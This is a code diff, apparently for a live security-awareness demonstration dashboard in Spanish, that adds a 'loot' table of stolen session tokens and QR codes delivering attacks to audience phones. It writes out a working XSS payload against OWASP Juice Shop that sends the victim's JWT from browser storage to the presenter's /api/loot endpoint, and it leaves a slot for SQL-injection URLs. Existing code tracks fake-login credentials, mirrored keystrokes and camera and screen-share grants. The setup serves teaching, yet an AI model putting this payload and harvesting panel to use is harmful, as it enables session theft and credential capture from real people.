@@ -35,6 +35,11 @@
     <div class="feedbox">
       <h2>📡 Eventos en tiempo real</h2>
       <div id="feed" class="feed"></div>
+      <h2 class="loothead">🔥 Botín (sesiones robadas)</h2>
+      <table class="loot">
+        <thead><tr><th>Hora</th><th>Origen</th><th>Víctima</th><th>Token (click copia)</th></tr></thead>
+        <tbody id="lootRows"></tbody>
+      </table>
     </div>
     <div class="qrbox">
       <h2>🔗 QR del concurso</h2>
@@ -43,12 +48,37 @@
       <div id="qr" class="qr"></div>
     </div>
   </section>
+
+  <section class="arsenal">
+    <div class="qrbox">
+      <h2>1️⃣ Cebo — la "tienda"</h2>
+      <p class="hint">La víctima se registra e inicia sesión aquí. Todo parece legítimo.</p>
+      <div id="qr1" class="qr mini"></div>
+      <div class="urlview" id="url1"></div>
+    </div>
+    <div class="qrbox">
+      <h2>2️⃣ Robo de sesión (XSS)</h2>
+      <p class="hint">Con la sesión iniciada, ejecuta el payload y manda el JWT al panel.</p>
+      <div id="qr2" class="qr mini"></div>
+      <div class="urlview" id="url2"></div>
+      <button id="btnCopy2" class="ghost">📋 Copiar URL</button>
+    </div>
+    <div class="qrbox">
+      <h2>3️⃣ Libre (SQLi u otro)</h2>
+      <p class="hint">Pega tu URL malicioso (p. ej. la UNION de Juice Shop).</p>
+      <input id="inpURL3" placeholder="http://IP:4000/rest/products/search?q=…">
+      <button id="btnQR3" class="cta">Generar QR</button>
+      <div id="qr3" class="qr mini"></div>
+      <div class="urlview" id="url3"></div>
+    </div>
+  </section>
 </div>
 
 <script>
 let tok = localStorage.qlab_token || '';
 let es = null;
 let refreshTimer = null;
+let lanIp = '';
 const $ = id => document.getElementById(id);
 
 async function api(path, opts) {
@@ -91,11 +121,12 @@ async function start() {
   try {
     const cfg = await (await fetch('/api/config')).json();
     if (cfg.publicUrl) $('inpURL').value = cfg.publicUrl;
+    if (cfg.lanIp) { lanIp = cfg.lanIp; renderArsenal(); }
   } catch (e) {}
 }
 
-const EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋' };
-const TXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada' };
+const EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', cookies_collected: '🍪', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋', loot_received: '🦠' };
+const TXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', cookies_collected: 'cookies visibles', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada', loot_received: 'payload XSS ejecutado' };
 
 // Estado en vivo por sesión (espejo de tecleo + último frame de pantalla).
 // Llega por SSE local, entre un refresco completo y el siguiente.
@@ -131,7 +162,8 @@ async function refresh() {
   $('counters').innerHTML = [
     ['Visitas', c.visitas], ['Credenciales', c.logins],
     ['Pidió cámara', c.camSolicitudes], ['Cámara ✔', c.camAceptadas], ['Cámara ✘', c.camRechazadas],
-    ['Pantallas 🖥️', c.pantallas || 0]
+    ['Pantallas 🖥️', c.pantallas || 0],
+    ['XSS ejecutado', c.lootEjec || 0], ['🔥 Sesiones robadas', c.lootRobos || 0]
   ].map(x => '<div class="counter"><div class="num">' + x[1] + '</div><div class="lbl">' + x[0] + '</div></div>').join('');
 
   const sessions = j.sessions.slice().sort((a, b) => a.last_seen - b.last_seen);
@@ -171,20 +203,72 @@ async function refresh() {
       if (e.payload.field) extra += ' · ' + e.payload.field + ' (' + e.payload.len + ' chars)';
     }
     const t = new Date(e.created_at).toLocaleTimeString();
-    return '<div class="ev ' + (e.type === 'fake_login_submitted' ? 'hot' : '') + '"><span class="t">' + t + '</span> ' + (EMOJI[e.type] || '•') + ' <b>' + (e.label || '—') + '</b> ' + (TXT[e.type] || e.type) + extra + '</div>';
+    const robado = e.type === 'loot_received' && e.payload && e.payload.stolen;
+    const txt = robado ? '🔥 SESIÓN ROBADA' : (TXT[e.type] || e.type);
+    return '<div class="ev ' + (e.type === 'fake_login_submitted' || robado ? 'hot' : '') + '"><span class="t">' + t + '</span> ' + (EMOJI[e.type] || '•') + ' <b>' + (e.label || '—') + '</b> ' + txt + extra + '</div>';
   }).join('');
+
+  const loots = j.loots || [];
+  $('lootRows').innerHTML = loots.length ? loots.map(l => {
+    const t = new Date(l.ts).toLocaleTimeString();
+    const ua = (String(l.ua || '').match(/Android|iPhone|iPad|Windows|Macintosh|Linux/) || ['?'])[0];
+    const who = l.stolen ? (l.email || 'sesión robada') : 'sin sesión (none)';
+    const tok = l.stolen ? '<code class="tok" data-tok="' + esc(l.token) + '" title="click para copiar">' + esc(l.token.slice(0, 48)) + '…</code>' : '—';
+    return '<tr class="' + (l.stolen ? 'hot' : '') + '"><td>' + t + '</td><td>' + esc(ua) + '</td><td>' + esc(who) + '</td><td>' + tok + '</td></tr>';
+  }).join('') : '<tr><td colspan="4" class="empty">Aún no hay ejecuciones del payload.</td></tr>';
 }
 
 $('btnReveal').onclick = () => api('/api/admin/reveal', { method: 'POST' });
 $('btnReset').onclick = () => { for (const k of Object.keys(live)) delete live[k]; api('/api/admin/reset', { method: 'POST' }); };
 $('btnFS').onclick = () => document.documentElement.requestFullscreen().catch(() => {});
+function renderQR(el, url, size) {
+  el.innerHTML = '';
+  try { new QRCode(el, { text: url, width: size || 240, height: size || 240 }); }
+  catch (e) { el.textContent = url; }
+}
 $('btnQR').onclick = () => {
   const url = $('inpURL').value.trim();
-  if (!url) return;
-  $('qr').innerHTML = '';
-  try { new QRCode($('qr'), { text: url, width: 240, height: 240 }); }
-  catch (e) { $('qr').textContent = url; }
+  if (url) renderQR($('qr'), url);
 };
+
+// ---------- Arsenal QR: robo de sesión contra Juice Shop ----------
+// OJO: sessionStorage es por origen — todas las URLs usan la IP LAN (lanIp),
+// nunca localhost, o la víctima no tendrá el token y llegará loot=none.
+function payloadRobo(ip) {
+  return `<iframe src="javascript:fetch('http://${ip}:3000/api/loot?loot='+encodeURIComponent(sessionStorage.getItem('token')||localStorage.getItem('token')||'none'),{mode:'no-cors'})">`;
+}
+function renderArsenal() {
+  if (!lanIp) {
+    $('url1').textContent = 'No se detectó IP LAN. Arranca con LAN_IP=tu.ip make up (o npm start con LAN_IP en .env).';
+    return;
+  }
+  const u1 = `http://${lanIp}:4000/`;
+  $('url1').textContent = u1;
+  renderQR($('qr1'), u1, 160);
+  const u2 = `http://${lanIp}:4000/#/search?q=${encodeURIComponent(payloadRobo(lanIp))}`;
+  $('url2').textContent = u2;
+  renderQR($('qr2'), u2, 160);
+}
+$('btnQR3').onclick = () => {
+  const url = $('inpURL3').value.trim();
+  if (!url) return;
+  $('url3').textContent = url;
+  renderQR($('qr3'), url, 160);
+};
+$('btnCopy2').onclick = () => {
+  const u = $('url2').textContent;
+  if (!u) return;
+  navigator.clipboard.writeText(u).then(() => {
+    $('btnCopy2').textContent = '✔ Copiado';
+    setTimeout(() => { $('btnCopy2').textContent = '📋 Copiar URL'; }, 1500);
+  });
+};
+// Click en un token de la tabla de botín → copia el JWT completo (para el remate).
+$('lootRows').addEventListener('click', e => {
+  const t = e.target.closest('.tok');
+  if (!t) return;
+  navigator.clipboard.writeText(t.dataset.tok).then(() => { t.textContent = '✔ copiado'; });
+});
 start();
 </script>
 </body>
